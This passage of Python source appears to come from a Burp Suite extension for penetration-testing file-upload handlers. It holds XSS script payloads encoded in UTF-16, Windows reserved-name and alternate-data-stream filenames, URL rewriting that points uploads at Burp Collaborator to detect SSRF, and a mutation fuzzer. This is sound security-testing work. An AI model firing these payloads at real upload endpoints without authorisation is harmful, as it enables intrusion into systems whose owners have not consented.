            "%" + "%".join([struct.pack("B", x) for x in range(0x20, 0x2f)]) + file_extension,
            '\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x002\x003\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00',
            # BOM_UTF-16_LE
            '\xfe\xff\x00<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x001\x002\x003\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>',
            # BOM_UTF-16_BE
            'COM1',
            'COM1' + file_extension,
            # not allowed on Windows as a file name: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9
            'test.exe:',
            'test.exe:' + file_extension,
            # Also not allowed on windows
            'test.{D20EA4E1-3957-11d2-A40B-0C5020524153}',
            'test::{D20EA4E1-3957-11d2-A40B-0C5020524153}',
            # a Windows feature called CLSID https://www.tenforums.com/tutorials/3123-clsid-key-guid-shortcuts-list-windows-10-a.html but it must be a folder name!
            '*',
            '*' + file_extension,
            # can get really weird results, as this file could afterwards result in being the only match to a unix search
            # for ./* while actually such a search should match everything
            '.', # Generated PHP error "move_uploaded_file(): The second argument to copy() function cannot be a directory" in the past
            '.' + file_extension,
        )
        content = injector.get_uploaded_content()
        for i in payloads:
            req = injector.get_request(i, content)
            if req:
                Checks_Helper.make_http_request(self.burp_extender, injector, req)

    def _generic_url_do_replace(self, burp_colab, prot, orig_content):
        # Case destroying the file size (e.g. for XML things)
        colab_url = burp_colab.generate_payload(True)
        content_replace = orig_content.replace(prot, prot + colab_url + "/")
        yield content_replace, colab_url

        # Case keeping the file size and hopefully if we are lucky even the correct file format (e.g. for ASN1)
        new_content = ""
        search_content = orig_content
        colab_url2 = burp_colab.generate_payload(True)
        while prot in search_content:
            index = search_content.find(prot)
            new_content += search_content[:index]
            payload = prot + colab_url2 + "/"
            new_content += payload
            search_content = search_content[index + len(payload):]
        new_content += search_content
        # If we have a prot at the very end the new_content will be too large, so truncate:
        new_content = new_content[:len(orig_content)]
        yield new_content, colab_url2

    def _generic_url_replacer(self, injector, burp_colab):
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        # burp collaborator based URL replacing
        # Simply replaces all http:// with http://burp.collaborator.domain/
        # eg.
        # http://www.example.org/file.cgi?test=123
        # turns into:
        # http://burp.collaborator.domain/www.example.org/file.cgi?test=123

        name = "URL replacement collaborator interaction"
        severity = "Medium"
        confidence = "Tentative"
        detail = "A Burp Colaborator interaction was detected when replacing all ftp, http and https " \
                 "URLs with a burp colaborator URL. This means that Server Side Request Forgery is possible " \
                 "if this request was coming from the server. " \
                 "Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        colab_tests = []
        filename = injector.get_uploaded_filename()
        name, ext = os.path.splitext(filename)
        orig_content = injector.get_uploaded_content()
        i = 0
        for prot in Constants.PROTOCOLS_HTTP:
            if prot in orig_content:
                for content, colab_url in self._generic_url_do_replace(burp_colab, prot, orig_content):
                    req = injector.get_request(name + str(i) + ext, content)
                    i += 1
                    if req:
                        urr = Checks_Helper.make_http_request(self.burp_extender, injector, req)
                        if urr:
                            colab_tests.append(ColabTest(colab_url, urr, issue))

        return colab_tests

    def _recursive_upload_files(self, injector, burp_colab):
        # Dimensions are:
        # filename:       from original request, from file
        # file extension: from original request, from file, using the default, guessing by mime type
        # mime_type:      from original request, guessing by file, guessing by file extension
        # File content:   Always from file
        if not injector.opts.ru_dirpath:
            return

        name = "Recursive upload SSRF"
        severity = "Medium"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when doing the recursive uploads, replacing all URLs within " \
                 "file contents with one that contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                 "You might be able to read local files with this issue, etc. <br>" \
                 "Interactions:<br><br>"
        issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)

        old_name, old_ext = os.path.splitext(injector.get_uploaded_filename())
        colab_tests = []
        for path, _, files in os.walk(injector.opts.ru_dirpath):
            for filename in files:
                filename = FloydsHelpers.u2s(filename)
                filepath = os.path.join(path, filename)
                new_name, new_ext = os.path.splitext(filename)
                if injector.opts.ru_keep_filename:
                    new_name = old_name
                if injector.opts.ru_keep_file_extension:
                    new_ext = old_ext
                mime_type = None
                if not new_ext:
                    new_ext = injector.get_default_file_ext()
                if not injector.opts.ru_keep_mime_type:
                    if injector.opts.ru_believe_file_extension:
                        mime_type = FloydsHelpers.mime_type_from_ext(new_ext)
                    else:
                        m = FloydsHelpers.mime_type_from_content(filepath)
                        if m:
                            mime_type = m
                        else:
                            print("Couldn't find mime_type for", filepath)
                            print("Trying file extension")
                            mime_type = FloydsHelpers.mime_type_from_ext(new_ext)
                if injector.opts.ru_guess_file_ext:
                    if mime_type:
                        new_ext = FloydsHelpers.file_extension_from_mime(mime_type)
                    else:
                        new_ext = FloydsHelpers.file_extension_from_mime(FloydsHelpers.mime_type_from_content(filepath))

                content = file(os.path.join(path, filename), "rb").read()
                if not mime_type:
                    mime_type = injector.get_uploaded_content_type()

                # Send the original content first
                new_filename = new_name + "0" + new_ext
                print("Recursive Uploader doing", new_filename, mime_type)
                req = injector.get_request(new_filename, content, mime_type)
                if req:
                    Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=new_filename)

                # Combine with replacer
                if injector.opts.ru_combine_with_replacer and burp_colab:
                    i = 1
                    for prot in Constants.PROTOCOLS_HTTP:
                        if prot in content:
                            for content, colab_url in self._generic_url_do_replace(burp_colab, prot, content):
                                new_filename = new_name + str(i) + new_ext
                                i += 1
                                print("Recursive Uploader doing", new_filename, mime_type, colab_url)
                                req = injector.get_request(new_filename, content, mime_type)
                                if req:
                                    urr = Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=new_filename)
                                    if urr:
                                        colab_tests.append(ColabTest(colab_url, urr, issue))
        return colab_tests

    def _fuzz(self, injector):
        content = injector.get_uploaded_content()
        if not content:
            return
        orig_filename = injector.get_uploaded_filename()
        name_increment = 1
        for _ in xrange(0, injector.opts.fuzzer_known_mutations):
            new_content = copy(content)
            index = random.choice(xrange(0, len(new_content)))
            print("At byte index", index, "inserted known fuzz string")
            new_content = new_content[:index] + random.choice(Constants.KNOWN_FUZZ_STRINGS) + new_content[index + 1:]
            name, ext = os.path.splitext(orig_filename)
            new_filename = name + str(name_increment) + ext
            name_increment += 1
            req = injector.get_request(new_filename, new_content)
            if req:
                Checks_Helper.make_http_request(self.burp_extender, injector, req)
        for _ in xrange(0, injector.opts.fuzzer_random_mutations):
            new_content = copy(content)
            index = random.randint(0, len(new_content) - 1)
            if random.choice((True, False)):
                # byte change
                print("At byte index", index, "changed to new byte")
                new_content = new_content[:index] + chr(random.randint(0, 255)) + new_content[index + 1:]
            else:
                # bit change
                bit_index = random.randint(0, 7)
                print("At byte index", index, "changed bit", bit_index)
                new_byte = chr(ord(new_content[index]) ^ (2 ** bit_index))
                new_content = new_content[:index] + new_byte + new_content[index + 1:]
            name, ext = os.path.splitext(orig_filename)
            new_filename = name + str(name_increment) + ext
            name_increment += 1
            req = injector.get_request(new_filename, new_content)
            if req:
                Checks_Helper.make_http_request(self.burp_extender, injector, req)
